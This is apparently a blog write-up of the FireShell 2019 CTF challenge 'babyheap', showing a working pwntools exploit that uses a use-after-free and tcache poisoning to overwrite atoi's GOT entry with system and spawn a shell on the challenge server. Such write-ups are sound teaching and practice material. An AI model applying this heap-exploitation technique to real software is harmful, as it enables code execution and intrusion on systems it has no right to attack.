+++
title = "FireShell 2019 - babyheap"
date = "2019-01-28 06:54:34"
categories = ["pwn", "writeup"]
+++
## downloads
- [binary](/assets/fireshell/babyheap/babyheap.zip)
- [libc.so.6](/assets/fireshell/babyheap/libc.so.6)
- [solve.py](/assets/fireshell/babyheap/solve.py)

## summary
1. `create`, `edit`, `show`, `delete`, and `fill`, each functions can only be used once.
2. UAF in `delete`, after chunk gets freed but didn't `NULL` the buf pointer.
3. `delete` will reset the `create` 'consumption', but you can't `delete` again after that.
4. Use tcache-poisoning to control heap return arbritrary address

## exploit
A brief helper function,
```python
def fill(buf):
    r.sendlineafter('> ', '1337')
    r.sendafter('Fill ', buf)

def create():
    r.sendlineafter('> ', '1')

def edit(buf):
    r.sendlineafter('> ', '2')
    r.sendafter('Content? ', buf)

def show():
    r.sendlineafter('> ', '3')
    r.recvuntil('Content: ')
    return r.recvuntil('\n----', drop=True)

def delete():
    r.sendlineafter('> ', '4')
```

trigger free to put tcache,
```python
create() # init tcache, heap, ...

# pwndbg> x/6gx 0x6020a0
# 0x6020a0:       0x0000000000000001      0x0000000000000000
#                   ^-- create used
# 0x6020b0:       0x0000000000000000      0x0000000000000000
# 0x6020c0:       0x0000000000000000      0x0000000002050250
#                                           ^-- buf

delete() # trigger UAF

# pwndbg> x/6gx 0x6020a0
# 0x6020a0:       0x0000000000000000      0x0000000000000000
#                   ^-- create reset
# 0x6020b0:       0x0000000000000000      0x0000000000000001
#                                           ^-- delete used
# 0x6020c0:       0x0000000000000000      0x0000000002050250

# pwndbg> tcachebins
# tcachebins
# 0x70 [  1]: 0x2050250 ◂— 0x0
```

use UAF to _poison_ tcache free list, put .bss + 0x20 to control function _'consumption'_
and buf pointer.
```python
edit(p64(elf.bss(0x20))) # 0x6020a0, function 'consumption' and buf pointer

# pwndbg> dq 0x2050250
# 0000000002050250     0000000000000000 0000000000000071
# 0000000002050260     00000000006020a0 0000000000000000
# 0000000002050270     0000000000000000 0000000000000000
# 0000000002050280     0000000000000000 0000000000000000

# pwndbg> tcachebins 
# tcachebins
# 0x70 [  1]: 0x2050260 —▸ 0x6020a0 ◂— 0x0
```

Second next `malloc(0x68)` request will create a chunk at `0x6020a0`,
and we could fill it with bunch of `NULL`s to control funtion _'consumption'_,
plus overwrite buf pointer to gain arbitrary read/write, in here I'll use GOT `atoi`
as it'll be easier to leak libc and overwrite it with `system`.
```python
create() # first request

# pwndbg> tcachebins 
# tcachebins
# 0x70 [  0]: 0x6020a0 ◂— 0x1

payload  = p64(0) # fill bunch of NULLs
payload += p64(0) # fill bunch of NULLs
payload += p64(0) # fill bunch of NULLs
payload += p64(0) # fill bunch of NULLs
payload += p64(0) # fill bunch of NULLs
payload += p64(elf.got['atoi']) # buf, get r/w, 0x602060
fill(payload) # second request

# pwndbg> tcachebins 
# tcachebins
# 0x70 [ -1]: 0x1

# pwndbg> dq 0x6020a0
# 00000000006020a0     0000000000000000 0000000000000000
# 00000000006020b0     0000000000000000 0000000000000000
# 00000000006020c0     0000000000000001 0000000000602060
#                       ^-- fill used    ^-- buf controlled
```

leak libc with `show` and overwrite `atoi` with `system`.
```python
libc.address = u64(show().ljust(8, '\x00')) - libc.symbols['atoi']

edit(p64(libc.symbols['system']))
```

Trigger `atoi('/bin/sh')` which is now `system('/bin/sh')`

```python
r.sendlineafter('> ', '/bin/sh')
```

Profit.

## flag
```
[+] Opening connection to 35.243.188.20 on port 2000: Done
[*] Switching to interactive mode
$ ls
babyheap
babyheap.sh
flag.txt
$ cat flag.txt
F#{W3lc0m3_t0_h34p_Expl01t4t10n!}$
[*] Interrupted
[*] Closed connection to 35.243.188.20 port 2000
```